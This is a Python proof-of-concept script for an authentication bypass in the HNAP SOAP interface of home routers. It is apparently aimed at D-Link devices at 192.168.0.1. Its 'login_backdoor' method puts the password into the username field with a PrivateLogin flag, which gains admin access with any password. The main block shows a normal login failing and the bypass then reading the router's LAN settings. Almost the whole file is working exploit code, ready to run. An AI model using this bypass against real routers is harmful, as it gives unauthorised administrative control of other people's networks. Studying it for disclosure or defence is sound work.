#!/usr/bin/env python3
import hmac
import re
import requests
import time

__author__ = 'tkmk'


class HNAP_session:
    SOAP_NAMESPACE = '"http://purenetworks.com/HNAP1/%s"'

    def __init__(self, hnap_url=None):
        self.hnap_url = hnap_url or 'http://192.168.0.1/HNAP1/'
        self.session = requests.Session()
        self.privkey = None

    def post(self, action, *args, headers=None, **kwargs):
        key = self.privkey or 'withoutloginkey'
        timestamp = int(time.time() * 1000)
        SOAPAction = self.SOAP_NAMESPACE % action
        auth = self._hmac(key, '%d%s' % (timestamp, SOAPAction))
        kwargs['headers'] = headers or {}
        kwargs['headers'].update({'SOAPAction': SOAPAction, 'HNAP_AUTH': '%s %d' % (auth, timestamp)})
        rsp = self.session.post(self.hnap_url, *args, **kwargs)
        return rsp

    def login(self, passwd):
        data1 = '<soap:Envelope><soap:Body><Login><Action>request</Action><Username>Admin</Username><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
        data2 = '<soap:Envelope><soap:Body><Login><Action>login</Action><Username>Admin</Username><LoginPassword>%s</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
        rsp = self.post('Login', data1)
        challenge = re.search('<Challenge>(.+)</Challenge>', rsp.text).groups()[0]
        publickey = re.search('<PublicKey>(.+)</PublicKey>', rsp.text).groups()[0]
        self.privkey = self._hmac(publickey + passwd, challenge)
        login_passwd = self._hmac(self.privkey, challenge)
        rsp2 = self.post('Login', data2 % login_passwd)
        return 'OK' in rsp2.text

    def login_backdoor(self, passwd):
        data1 = '<soap:Envelope><soap:Body><Login><Action>request</Action><Username>%s</Username><PrivateLogin>Username</PrivateLogin><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
        data2 = '<soap:Envelope><soap:Body><Login><Action>login</Action><Username>Admin</Username><LoginPassword>%s</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
        rsp = self.post('Login', data1 % passwd)
        challenge = re.search('<Challenge>(.+)</Challenge>', rsp.text).groups()[0]
        publickey = re.search('<PublicKey>(.+)</PublicKey>', rsp.text).groups()[0]
        self.privkey = self._hmac(publickey + passwd, challenge)
        login_passwd = self._hmac(self.privkey, challenge)
        rsp2 = self.post('Login', data2 % login_passwd)
        return 'OK' in rsp2.text

    def _hmac(self, key, message):
        key = key.encode()
        message = message.encode()
        return hmac.new(key, message).hexdigest().upper()


if __name__ == '__main__':
    fake_password = 'let_me_in' # this can be anything except for the real one
    ok = '<GetRouterLanSettingsResult>OK</GetRouterLanSettingsResult>'

    # login using the normal way with fake password, and fail to read the settings
    ses = HNAP_session()
    assert ses.login(fake_password) == False
    rsp = ses.post('GetRouterLanSettings', '<soap:Envelope><soap:Body><GetRouterLanSettings/></soap:Body></soap:Envelope>')
    assert ok not in rsp.text

    # login using the backdoor, now we can read the settings
    ses = HNAP_session()
    assert ses.login_backdoor(fake_password) == True
    rsp = ses.post('GetRouterLanSettings', '<soap:Envelope><soap:Body><GetRouterLanSettings/></soap:Body></soap:Envelope>')
    assert ok in rsp.text
    print(rsp.text)
